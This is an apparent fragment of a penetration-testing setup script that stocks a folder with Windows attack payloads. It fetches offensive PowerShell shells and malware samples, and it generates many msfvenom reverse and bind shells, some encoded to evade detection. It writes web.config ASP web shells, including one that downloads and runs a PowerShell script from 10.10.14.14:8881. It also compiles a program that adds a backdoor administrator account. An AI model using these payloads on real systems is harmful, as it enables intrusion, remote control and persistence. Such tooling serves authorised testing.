mkdir public/payloads_windows
cd public/payloads_windows

    wget -N https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1
    wget -N https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

    if [ ! -d "Simple Reverse Shell" ]; then
        git clone --depth=1 --recursive https://github.com/infoskirmish/Window-Tools.git
        mv Window-Tools/* .
        rm -rf .git
        rm -rf Window-Tools
    fi

    rm mini-reverse.ps1
    wget https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1
    sed -i "s/127.0.0.1/$source_ip/g" mini-reverse.ps1
    sed -i "s/413/$source_port/g" mini-reverse.ps1

    if [ ! -f shell_reverse_tcp_x86.exe ] || confirm "Regenerate payloads_windows [y/n]? " ; then
        # Reverse shells
        banner "payloads_windows: shell_reverse_tcp_*.exe"
        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -o shell_reverse_tcp_x86.exe
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -o shell_reverse_tcp_x64.exe

        banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.exe"
        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.exe
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.exe

        banner "payloads_windows: shell_reverse_tcp_*.asp"
        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f asp > shell_reverse_tcp_x86.asp
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f asp > shell_reverse_tcp_x64.asp

        banner "payloads_windows: shell_reverse_tcp_*.aspx"
        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f aspx > shell_reverse_tcp_x86.aspx
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f aspx > shell_reverse_tcp_x64.aspx

        banner "payloads_windows: shell_reverse_tcp_*.js_le"
        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le > shell_reverse_tcp_x86.js_le
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f js_le > shell_reverse_tcp_x64.js_le

        banner "payloads_windows: shell_reverse_tcp_*.python"
        msfvenom -p windows/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python > shell_reverse_tcp_x86.python
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=$source_ip LPORT=$source_port EXITFUNC=thread -f python > shell_reverse_tcp_x64.python

        banner "payloads_windows: shell_reverse_tcp_*_shikata_ga_nai.bin"
        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f raw -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.bin
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f raw -o shell_reverse_tcp_x64_shikata_ga_nai.bin

        banner "payloads_windows: shell_reverse_tcp_*.ps1"
        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread  -f psh -o shell_reverse_tcp_x86.ps1
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f psh -o shell_reverse_tcp_x64.ps1  

        banner "payloads_windows: shell_reverse_tcp_*.hta"
        msfvenom -p windows/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread  -f hta-psh -o shell_reverse_tcp_x86.hta
        echo ""
        msfvenom -p windows/x64/shell_reverse_tcp LPORT=$source_port LHOST=$source_ip EXITFUNC=thread -f hta-psh -o shell_reverse_tcp_x64.hta  
            
        # Bind shells
        banner "payloads_windows: shell_reverse_tcp_*.exe"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -o shell_bind_tcp_x86.exe
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -o shell_bind_tcp_x64.exe

        banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.exe"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.exe
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.exe

        banner "payloads_windows: shell_bind_tcp_*.asp"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f asp > shell_bind_tcp_x86.asp
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp


        banner "payloads_windows: shell_bind_tcp_*.aspx"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f aspx > shell_bind_tcp_x86.aspx
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f aspx > shell_bind_tcp_x64.aspx

        banner "payloads_windows: shell_bind_tcp_*.js_le"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le > shell_bind_tcp_x86.js_le
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f js_le > shell_bind_tcp_x64.js_le

        banner "payloads_windows: shell_bind_tcp_*.python"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python > shell_bind_tcp_x86.python
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f python > shell_bind_tcp_x64.python

        banner "payloads_windows: shell_bind_tcp_*_shikata_ga_nai.bin"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port -f raw -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.bin
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port -f raw -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.bin

        banner "payloads_windows: shell_bind_tcp_*.ps1"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f psh > shell_bind_tcp_x86.ps1
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f psh > shell_bind_tcp_x64.ps1

        banner "payloads_windows: shell_bind_tcp_*.hta"
        msfvenom -p windows/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f hta-psh > shell_bind_tcp_x86.hta
        echo ""
        msfvenom -p windows/x64/shell_bind_tcp LPORT=$remote_port EXITFUNC=thread -f hta-psh > shell_bind_tcp_x64.hta

# https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
banner "payloads_windows: asptest.asp.config"
cat <<\EOT >asptest.asp.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
EOT

banner "payloads_windows: aspcmd.asp.config"
cat <<\EOT >aspcmd.asp.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set oScript = Server.CreateObject("WScript.Shell")
Set oScriptNet = Server.CreateObject("WScript.Network")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<% Response.Write(Request.ServerVariables("SERVER_NAME")) %>
<p>
<b>The server's local address:</b>
<% Response.Write(Request.ServerVariables("LOCAL_ADDR")) %>
</p>
<p>
<b>The server's port:</b>
<% Response.Write(Request.ServerVariables("SERVER_PORT")) %>
</p>
<p>
<b>The server's software:</b>
<% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %>
</p>
<p>
<b>Command output:</b>
<%
szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)
%>
</p>
<br>
</BODY>

<% Response.write("<!-"&"-") %>
-->
EOT

banner "payloads_windows: asppower.asp.config"
cat <<\EOT >asppower.asp.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.14:8881/sh3ll.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>

<% Response.write("<!-"&"-") %>
-->
EOT

banner "windows_linux: useradd.c"
cat <<\EOT >useradd.c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */
int main () {
int i;
i=system ("net user amxuser amxpass1234 /add & net localgroup administrators amxuser /add & net localgroup \"Remote Desktop Users\" amxuser /add"); return 0;
}
EOT
i686-w64-mingw32-gcc -o useradd.exe -lws2_32 useradd.c

        # echo -e '#include <stdio.h>\n#include <smain () {\nsystem("net user brisksec brisksec /add & net localgroup administrators brisksec /add");\nreturn(0);\n}'> poc.c

        wget -N https://raw.githubusercontent.com/paranoidninja/ScriptDotSh-MalwareDevelopment/master/prometheus.cpp
        wget -N https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/raw/master/prometheus.exe
        wget -N https://raw.githubusercontent.com/paranoidninja/ScriptDotSh-MalwareDevelopment/master/prometheus_v2.cpp
        # apt-get install g++-mingw-w64
        # i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

        # Create all common shells in payloads_windows folder
        bash ../../_setup/setup_payloads.sh
      
   fi

cd ../..
